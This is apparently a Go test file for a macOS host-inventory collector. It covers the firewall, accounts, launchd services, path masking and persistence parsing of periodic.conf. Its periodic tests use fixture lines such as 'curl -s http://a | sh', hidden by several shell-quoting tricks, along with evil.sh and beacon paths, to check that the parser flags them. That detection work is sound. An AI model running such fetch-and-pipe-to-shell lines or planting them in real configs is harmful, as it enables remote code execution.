package hostenv

import (
	"context"
	"io/fs"
	"os"
	"strings"
	"testing"
	"time"
)

// errMac is fakeMac whose commands can fail with an error, output kept.
type errMac struct {
	fakeMac
	errs map[string]error
}

func (f errMac) Run(ctx context.Context, argv []string) (CmdResult, error) {
	k := strings.Join(argv, " ")
	if err, ok := f.errs[k]; ok {
		return CmdResult{Stdout: []byte(f.cmds[k])}, err
	}
	return f.fakeMac.Run(ctx, argv)
}

func key(argv []string) string { return strings.Join(argv, " ") }

// N-M1: pf enabled does not make the firewall enabled; pf unreadable does
// not make the fact partial.
func TestDarwinFirewallPfNoted(t *testing.T) {
	src := fakeMac{cmds: map[string]string{
		key(alfStateArgv): "Firewall is disabled. (State = 0)\n", key(alfBlockAllArgv): "Firewall has block all state set to disabled.\n",
		key(alfStealthArgv): "Firewall stealth mode is off\n", key(pfInfoArgv): "Status: Enabled for 0 days 00:01:02\n"}}
	fw := DarwinCollector{}.Firewall(context.Background(), src)
	if fw.Status != StatusOK || fw.Value.Enabled || fw.Value.Extra["pf"] != "enabled (rules not read)" {
		t.Errorf("pf enabled: %+v", fw)
	}
	delete(src.cmds, key(pfInfoArgv))
	if fw = (DarwinCollector{}).Firewall(context.Background(), src); fw.Status != StatusOK || fw.Value.Extra["pf"] != "unknown (needs root)" {
		t.Errorf("pf unknown: %+v", fw)
	}
}

// N-M3: a dscl query that fails, and a login account's home outside /Users,
// are said.
func TestDarwinAccountsSaysWhy(t *testing.T) {
	src := fakeMac{cmds: map[string]string{
		key(dsclUIDArgv):   "root 0\nalice 501\nbob 502\n",
		key(dsclHomeArgv):  "root /var/root\nalice /Users/alice\nbob /Volumes/Data/bob\n",
		key(dsclAdminArgv): "GroupMembership: root alice\n"}}
	o := DarwinCollector{}.Accounts(context.Background(), src)
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "shells unknown") {
		t.Errorf("shell query failed: %s %q", o.Status, o.Detail)
	}
	src.cmds[key(dsclShellArgv)] = "root /bin/sh\nalice /bin/zsh\nbob /bin/zsh\n"
	o = DarwinCollector{}.Accounts(context.Background(), src)
	if o.Status != StatusOK {
		t.Errorf("all queries answered: %s %q", o.Status, o.Detail)
	}
	// A home outside /Users is read too, not skipped.
	agent := plistXML("Label", "com.example.bob", "Program", "/Volumes/Data/bob/bin/x")
	svcSrc := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{"/Volumes/Data/bob/Library/LaunchAgents/b.plist": agent}},
		dirs: map[string][]string{"/Volumes/Data/bob/Library/LaunchAgents": {"b.plist"}}}
	svcs, _ := DarwinCollector{}.Services(svcSrc, o)
	found := false
	for _, s := range svcs.Value {
		found = found || s.Name == "com.example.bob"
	}
	if !found {
		t.Errorf("agents of a home outside /Users not read: %+v", svcs)
	}
}

// N-M4: ps args cut short keeps what came and is partial; failing is partial.
func TestDarwinProcessesArgsPartial(t *testing.T) {
	ps := "  10     1   501 alice    01:00 /Applications/ExampleEditor.app/Contents/MacOS/ExampleEditor\n"
	src := errMac{fakeMac: fakeMac{cmds: map[string]string{key(macPsArgv): ps, key(macPsArgsArgv): "  10 /Applications/ExampleEditor.app/Contents/MacOS/ExampleEditor --x\n"}},
		errs: map[string]error{key(macPsArgsArgv): ErrTruncated}}
	o := DarwinCollector{}.Processes(context.Background(), src, time.Now())
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "cut short") || len(o.Value) != 1 || o.Value[0].Cmdline == "" {
		t.Errorf("args cut: %+v", o)
	}
	src.errs[key(macPsArgsArgv)] = ErrTimeout
	if o = (DarwinCollector{}).Processes(context.Background(), src, time.Now()); o.Status != StatusPartial || o.Reason != ReasonTimeout {
		t.Errorf("args timed out: %+v", o)
	}
	delete(src.errs, key(macPsArgsArgv))
	delete(src.cmds, key(macPsArgsArgv))
	if o = (DarwinCollector{}).Processes(context.Background(), src, time.Now()); o.Status != StatusPartial || !strings.Contains(o.Detail, "command lines unknown") {
		t.Errorf("args failed: %+v", o)
	}
}

// N-M6: XProtect's real-time protection is said to be assumed.
func TestDarwinXProtectAssumed(t *testing.T) {
	src := statMac{fakeMac: fakeMac{files: map[string]string{xprotectBundles[0]: "<plist><dict></dict></plist>"}}}
	o := DarwinCollector{}.XProtect(src, time.Now())
	if !o.Value.RealTime || !strings.Contains(o.Detail, "real_time assumed") {
		t.Errorf("%+v", o)
	}
}

// statMac answers Stat for the files it holds.
type statMac struct{ fakeMac }

func (s statMac) Stat(p string) (FileStat, error) {
	if _, ok := s.files[p]; ok {
		return FileStat{ModTime: time.Now().Add(-48 * time.Hour)}, nil
	}
	return FileStat{}, &notExist{p}
}

// netstat past the output cap keeps what was read, partial (not unknown).
func TestDarwinNetstatCutKept(t *testing.T) {
	head := "Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)          rxbytes      txbytes  rhiwat  shiwat          process:pid    state  options           gencnt    flags   flags1 usecnt rtncnt fltrs\n"
	tcp := head + "tcp4       0      0  *.22                   *.*                    LISTEN                 0            0  131072  131072          launchd:1      00100 00000006 0000000001 00000001 00000800      1      0 000000\n"
	src := errMac{fakeMac: fakeMac{cmds: map[string]string{key(netstatTCPArgv): tcp, key(netstatUDPArgv): head}},
		errs: map[string]error{key(netstatTCPArgv): ErrTruncated}}
	o := DarwinCollector{}.Listeners(context.Background(), src)
	if o.Status != StatusPartial || o.Reason != ReasonTruncated || len(o.Value) != 1 || o.Value[0].Port != 22 {
		t.Errorf("%+v", o)
	}
}

// launchd: UserName says whom a daemon runs as; launchctl's overrides turn
// jobs off or on; a path with spaces is kept whole; a link anywhere below a
// home stops the walk.
func TestDarwinLaunchdUserOverridesLinks(t *testing.T) {
	daemon := plistXML("Label", "com.example.d", "UserName", "_example", "RunAtLoad", "<true/>",
		"ProgramArguments", "<array><string>/Library/Application Support/Ex/run</string><string>-x</string></array>")
	overrides := plistXML("com.example.d", "<true/>")
	src := linkMac{fakeMacDirs: fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
		"/Library/LaunchDaemons/d.plist": daemon, launchOverrides: overrides}},
		dirs: map[string][]string{"/Library/LaunchDaemons": {"d.plist"}, "/Users/alice/Library/LaunchAgents": {}}},
		links: map[string]bool{"/Users/alice/Library": true}}
	o, _ := DarwinCollector{}.Services(src, OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}}))
	if len(o.Value) != 1 || o.Value[0].RunAs != "_example" || o.Value[0].StartMode != "disabled" || o.Value[0].Exe != "/Library/Application Support/Ex/run" {
		t.Errorf("services %+v", o.Value)
	}
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "symlink_not_followed: /Users/alice/Library") {
		t.Errorf("link below the home: %s %q", o.Status, o.Detail)
	}
}

// plistXML builds an XML plist dict; values starting with "<" are raw.
func plistXML(kv ...string) string {
	s := "<plist><dict>"
	for i := 0; i+1 < len(kv); i += 2 {
		v := kv[i+1]
		if !strings.HasPrefix(v, "<") {
			v = "<string>" + v + "</string>"
		}
		s += "<key>" + kv[i] + "</key>" + v
	}
	return s + "</dict></plist>"
}

// linkMac is fakeMacDirs where some paths are symbolic links.
type linkMac struct {
	fakeMacDirs
	links map[string]bool
}

func (l linkMac) Readlink(p string) (string, error) {
	if l.links[p] {
		return "/elsewhere", nil
	}
	return "", &notExist{p}
}

// N-M5: a path below a home is masked to the end of its field: commas,
// parentheses, runs of spaces, "-", "=" and ":" do not stop it; a kept
// place stays and what follows it is masked again.
func TestHomePathWithSpaces(t *testing.T) {
	m := &Masker{Users: []string{"alice"}}
	m.init()
	for _, in := range []string{
		"/Users/alice/Desktop/Client Files/plan v2.txt --out /Users/alice/Library/LaunchAgents/a.plist",
		"/Users/alice/Clients/Acme, Inc (2026)/q3:plan=final - draft.txt",
		"/Users/alice/Projects/a  b/c",
	} {
		got := m.text(in, true, true)
		for _, leak := range []string{"Client", "Acme", "Inc", "2026", "plan", "draft", "Projects", "a  b"} {
			if strings.Contains(got, leak) {
				t.Errorf("%q -> %q leaks %q", in, got, leak)
			}
		}
		if !strings.HasPrefix(got, "/Users/user1/redacted") {
			t.Errorf("%q -> %q", in, got)
		}
	}
	got := m.text("/Users/alice/.ssh/authorized_keys /Users/alice/Desktop/secret, notes; next", true, true)
	if !strings.HasPrefix(got, "/Users/user1/.ssh/authorized_keys /Users/user1/redacted") || strings.Contains(got, "secret") || !strings.HasSuffix(got, "; next") {
		t.Errorf("kept then masked: %q", got)
	}
	// A kept file name that goes on past a space: the rest is masked.
	got = m.text("/Users/alice/.ssh/authorized keys of Acme --x", true, true)
	if strings.Contains(got, "Acme") || !strings.HasPrefix(got, "/Users/user1/.ssh/authorized redacted") || !strings.HasSuffix(got, " --x") {
		t.Errorf("kept name with a space: %q", got)
	}
	// /Users/Shared is masked below it; "redactedfoo" is not taken as masked.
	if got = m.text("/Users/Shared/Clients/Acme Inc/plan.txt", true, true); strings.Contains(got, "Acme") || !strings.HasPrefix(got, "/Users/Shared/redacted") {
		t.Errorf("Shared: %q", got)
	}
	if got = m.text("/Users/alice/redactedfoo/Acme", true, true); strings.Contains(got, "Acme") {
		t.Errorf("redactedfoo kept: %q", got)
	}
}

// S: a dscl home path with spaces (two in a row too) is kept whole.
func TestDsclHomeWithSpaces(t *testing.T) {
	m := dsclList([]byte("alice                   /Users/alice\nbob                     /Volumes/Data/Bob  Smith\n"))
	if m["alice"] != "/Users/alice" || m["bob"] != "/Volumes/Data/Bob  Smith" {
		t.Errorf("%q", m)
	}
}

// launchctl's system overrides apply to daemons only: a user agent named like
// a turned-off daemon is not taken as off.
func TestDarwinOverridesSystemOnly(t *testing.T) {
	agent := plistXML("Label", "com.example.d", "Program", "/Users/alice/x", "RunAtLoad", "<true/>")
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
		"/Users/alice/Library/LaunchAgents/a.plist": agent, launchOverrides: plistXML("com.example.d", "<true/>")}},
		dirs: map[string][]string{"/Users/alice/Library/LaunchAgents": {"a.plist"}}}
	o, _ := DarwinCollector{}.Services(src, OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}}))
	if len(o.Value) != 1 || o.Value[0].StartMode != "auto" {
		t.Errorf("agent taken as off by the system override: %+v", o.Value)
	}
}

// N-M3: accounts unknown (dscl failed): user LaunchAgents are said not read.
// N-M7: a user's disabled.<uid>.plist turns off that user's agent only.
func TestDarwinServicesAccountsAndUserOverrides(t *testing.T) {
	o, _ := DarwinCollector{}.Services(fakeMacDirs{fakeMac: fakeMac{}}, Unknown[[]Account](ReasonCommandFailed, "dscl: exit 1"))
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "user LaunchAgents not read (accounts unknown: dscl: exit 1)") {
		t.Errorf("accounts unknown: %s %q", o.Status, o.Detail)
	}
	agent := plistXML("Label", "com.example.a", "Program", "/x", "RunAtLoad", "<true/>")
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{
		"/Users/alice/Library/LaunchAgents/a.plist": agent, "/Users/bob/Library/LaunchAgents/a.plist": agent,
		userOverrides("501"): plistXML("com.example.a", "<true/>")}},
		dirs: map[string][]string{"/Users/alice/Library/LaunchAgents": {"a.plist"}, "/Users/bob/Library/LaunchAgents": {"a.plist"}}}
	o, jobs := DarwinCollector{}.Services(src, OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}, {Name: "bob", UID: "502", Home: "/Users/bob", CanLogin: true}}))
	got := map[string]bool{}
	for _, j := range jobs {
		got[j.path] = j.disabled
	}
	if !got["/Users/alice/Library/LaunchAgents/a.plist"] || got["/Users/bob/Library/LaunchAgents/a.plist"] {
		t.Errorf("per-user overrides: %v (%+v)", got, o)
	}
}

// countMac counts how often each command runs.
type countMac struct {
	fakeMac
	runs map[string]int
}

func (c countMac) Run(ctx context.Context, argv []string) (CmdResult, error) {
	c.runs[key(argv)]++
	return c.fakeMac.Run(ctx, argv)
}

// S: SIP in a custom configuration is off with a correct detail (not "no
// answer"), and each protection command runs once.
func TestDarwinProtectionsCustomOnce(t *testing.T) {
	src := countMac{fakeMac: fakeMac{cmds: map[string]string{
		key(csrutilArgv):  "System Integrity Protection status: unknown (Custom Configuration).\n\nConfiguration:\n\tKext Signing: disabled\n",
		key(spctlArgv):    "assessments enabled\n",
		key(fdesetupArgv): "FileVault is On.\n"}}, runs: map[string]int{}}
	o := DarwinCollector{}.Protections(context.Background(), src)
	if o.Status != StatusOK || o.Value.Integrity != "off" || !strings.Contains(o.Detail, "custom configuration") || strings.Contains(o.Detail, "no answer") {
		t.Errorf("%+v", o)
	}
	for k, n := range src.runs {
		if n != 1 {
			t.Errorf("%s ran %d times", k, n)
		}
	}
}

// S: a long Program is cut at MaxCmdline; ProgramArguments with a
// non-string item makes services partial.
func TestDarwinLaunchdProgramCutAndOddArgs(t *testing.T) {
	if prog, cut := launchProgram(map[string]any{"Program": "/x/" + strings.Repeat("a", 2000)}); !cut || len(prog) > MaxCmdline+len("…") {
		t.Errorf("Program not cut: %d bytes, cut %v", len(prog), cut)
	}
	odd := plistXML("Label", "com.example.odd", "ProgramArguments", "<array><string>/x</string><integer>7</integer></array>")
	src := fakeMacDirs{fakeMac: fakeMac{files: map[string]string{"/Library/LaunchDaemons/o.plist": odd}},
		dirs: map[string][]string{"/Library/LaunchDaemons": {"o.plist"}}}
	o, _ := DarwinCollector{}.Services(src, OK([]Account(nil)))
	if o.Status != StatusPartial || !strings.Contains(o.Detail, "non-string items") {
		t.Errorf("%s %q", o.Status, o.Detail)
	}
}

// N-a: a global agent is disabled only when every login account has it off;
// one account that has it on (or follows a plist that runs it) keeps it on.
func TestDarwinGlobalAgentOverrides(t *testing.T) {
	agent := plistXML("Label", "com.example.g", "Program", "/x", "RunAtLoad", "<true/>")
	accts := OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}, {Name: "bob", UID: "502", Home: "/Users/bob", CanLogin: true}})
	run := func(files map[string]string) bool {
		files["/Library/LaunchAgents/g.plist"] = agent
		src := fakeMacDirs{fakeMac: fakeMac{files: files}, dirs: map[string][]string{"/Library/LaunchAgents": {"g.plist"}}}
		_, jobs := DarwinCollector{}.Services(src, accts)
		return jobs[0].disabled
	}
	off := plistXML("com.example.g", "<true/>")
	if run(map[string]string{userOverrides("501"): off}) {
		t.Error("off for alice only, bob still runs it: taken as disabled")
	}
	if !run(map[string]string{userOverrides("501"): off, userOverrides("502"): off}) {
		t.Error("off for every login account: not disabled")
	}
}

// deniedMac is fakeMacDirs where some files cannot be read (EACCES).
type deniedMac struct {
	fakeMacDirs
	denied map[string]bool
}

func (d deniedMac) ReadFile(p string) ([]byte, error) {
	if d.denied[p] {
		return nil, &fs.PathError{Op: "open", Path: p, Err: fs.ErrPermission}
	}
	return d.fakeMacDirs.ReadFile(p)
}

// N-a1: an override file that cannot be read or parsed leaves the job's
// state unknown: a plist's Disabled=true is not taken as off, and the file
// is listed. N-a2: with accounts unknown, a global agent is not taken as
// off either, and that is said.
func TestDarwinOverridesUnknownNotOff(t *testing.T) {
	off := plistXML("Label", "com.example.g", "Program", "/x", "Disabled", "<true/>")
	accts := OK([]Account{{Name: "alice", UID: "501", Home: "/Users/alice", CanLogin: true}})
	dirs := map[string][]string{"/Library/LaunchAgents": {"g.plist"}, "/Library/LaunchDaemons": {"d.plist"}}
	base := func(files map[string]string) map[string]string {
		files["/Library/LaunchAgents/g.plist"] = off
		files["/Library/LaunchDaemons/d.plist"] = strings.Replace(off, "com.example.g", "com.example.d", 1)
		return files
	}
	// alice's overrides unreadable; the system's unparsable.
	src := deniedMac{fakeMacDirs: fakeMacDirs{fakeMac: fakeMac{files: base(map[string]string{launchOverrides: "not a plist"})}, dirs: dirs},
		denied: map[string]bool{userOverrides("501"): true}}
	o, jobs := DarwinCollector{}.Services(src, accts)
	for _, j := range jobs {
		if j.disabled {
			t.Errorf("%s taken as off with its overrides unknown", j.label)
		}
	}
	if !strings.Contains(o.Detail, userOverrides("501")+" (permission_denied)") || !strings.Contains(o.Detail, launchOverrides+" (unparsable)") {
		t.Errorf("unread %q", o.Detail)
	}
	// Overrides readable and silent: the plist's Disabled stands.
	src2 := fakeMacDirs{fakeMac: fakeMac{files: base(map[string]string{})}, dirs: dirs}
	if _, jobs = (DarwinCollector{}).Services(src2, accts); !jobs[0].disabled || !jobs[1].disabled {
		t.Errorf("plist Disabled not kept: %+v", jobs)
	}
	// N-a2: accounts unknown.
	o, jobs = DarwinCollector{}.Services(src2, Unknown[[]Account](ReasonCommandFailed, "dscl: exit 1"))
	for _, j := range jobs {
		if j.scope == "agent" && j.disabled {
			t.Errorf("global agent taken as off with accounts unknown")
		}
	}
	if !strings.Contains(o.Detail, "global agents' per-user overrides not checked") {
		t.Errorf("unread %q", o.Detail)
	}
}

// S: dscl values keep their trailing spaces (part of a path).
func TestDsclTrailingSpace(t *testing.T) {
	if m := dsclList([]byte("carol   /Users/carol \n")); m["carol"] != "/Users/carol " {
		t.Errorf("%q", m["carol"])
	}
}

// Every way of hiding a command from a shell-like reader (A ${…}, B $'…',
// C heredoc, D ;#, G backticks) is listed: no shell is simulated, every line
// but blanks and plain comments is.
func TestPeriodicLinesConservative(t *testing.T) {
	for name, conf := range map[string]string{
		"A": "x=${y:-\"}\ncurl -s http://a | sh # \"\n",
		"B": "x=$'\\''\ncurl -s http://b | sh\n",
		"C": "cat <<EOF >/dev/null\n# \"\nEOF\ncurl -s http://c | sh\n",
		"D": "a=1 ;# \"\ncurl -s http://d | sh\n",
		"G": "a=`echo \"`\ncurl -s http://g | sh #\"`\n",
	} {
		got := strings.Join(ParsePeriodicConf([]byte(conf)), "\n")
		if !strings.Contains(got, "curl -s http://") {
			t.Errorf("%s: the command is not listed: %q", name, got)
		}
	}
	got := ParsePeriodicConf([]byte("# plain comment\n\n# it's a comment with a quote\na=1 \\\n# after a backslash\n"))
	want := []string{"# it's a comment with a quote", "a=1 \\", "# after a backslash"}
	if strings.Join(got, "|") != strings.Join(want, "|") {
		t.Errorf("comments: %q", got)
	}
}

// The stock /etc/defaults/periodic.conf (Apple's crontabs, testdata) gives no
// item, said in the detail; changed in any way (N-P2: a stock-looking line
// added) it is listed whole. N-P3: periodic_conf_files pointed elsewhere is
// listed. local_periodic folders are still listed.
func TestDarwinPeriodicConfFiles(t *testing.T) {
	stock, err := os.ReadFile("testdata/periodic/defaults-periodic.conf")
	if err != nil {
		t.Fatal(err)
	}
	run := func(files map[string]string, dirs map[string][]string) Obs[[]PersistenceItem] {
		return DarwinCollector{}.persistence(fakeMacDirs{fakeMac: fakeMac{files: files}, dirs: dirs}, nil, OK([]Service(nil)), OK([]AuthorizedKeyFile(nil)))
	}
	count := func(o Obs[[]PersistenceItem], loc, sub string) int {
		n := 0
		for _, it := range o.Value {
			if it.Location == loc && strings.Contains(it.Command, sub) {
				n++
			}
		}
		return n
	}
	o := run(map[string]string{"/etc/defaults/periodic.conf": string(stock)}, nil)
	if n := count(o, "/etc/defaults/periodic.conf", ""); n != 0 || !strings.Contains(o.Detail, "/etc/defaults/periodic.conf: stock defaults") {
		t.Errorf("stock defaults: %d items, %q", n, o.Detail)
	}
	o = run(map[string]string{"/etc/defaults/periodic.conf": string(stock) + "\t\t\t\ti=/path/evil.sh\n"}, nil)
	if count(o, "/etc/defaults/periodic.conf", "i=/path/evil.sh") != 1 || count(o, "/etc/defaults/periodic.conf", "") < 10 {
		t.Errorf("changed defaults not listed whole: %d items", count(o, "/etc/defaults/periodic.conf", ""))
	}
	o = run(map[string]string{"/etc/periodic.conf": "periodic_conf_files=\"/etc/periodic.conf /tmp/evil.sh\"\nlocal_periodic=\"/opt/x/periodic\"\n",
		"/etc/daily.local": "# nightly\nPATH=/tmp/evil:$PATH\n"}, map[string][]string{"/opt/x/periodic/daily": {"999.beacon"}})
	if count(o, "/etc/periodic.conf", "/tmp/evil.sh") != 1 || count(o, "/etc/daily.local", "PATH=/tmp/evil") != 1 {
		t.Errorf("periodic_conf_files or daily.local not listed: %+v", o.Value)
	}
	found := false
	for _, it := range o.Value {
		found = found || it.Location == "/opt/x/periodic/daily/999.beacon"
	}
	if !found {
		t.Error("local_periodic folder not listed")
	}
}

// Only space and tab are blanks: a "#" after \v, \f, \r or a non-ASCII space
// is no comment to the shell, so the line is listed; a CRLF stock file is
// not stock.
func TestPeriodicLinesBlanksAndCRLF(t *testing.T) {
	for _, l := range []string{"\v# curl -s http://x | sh", "\f#curl -s http://x | sh", "\u00a0# curl -s http://x | sh", "# curl -s http://x | sh\r"} {
		if got := ParsePeriodicConf([]byte(l + "\n")); len(got) != 1 {
			t.Errorf("%q: %q", l, got)
		}
	}
	stock, _ := os.ReadFile("testdata/periodic/defaults-periodic.conf")
	if !stockDefaults(stock) || stockDefaults([]byte(strings.ReplaceAll(string(stock), "\n", "\r\n"))) || stockDefaults(stock[:len(stock)-1]) {
		t.Error("stock: exact bytes only")
	}
}
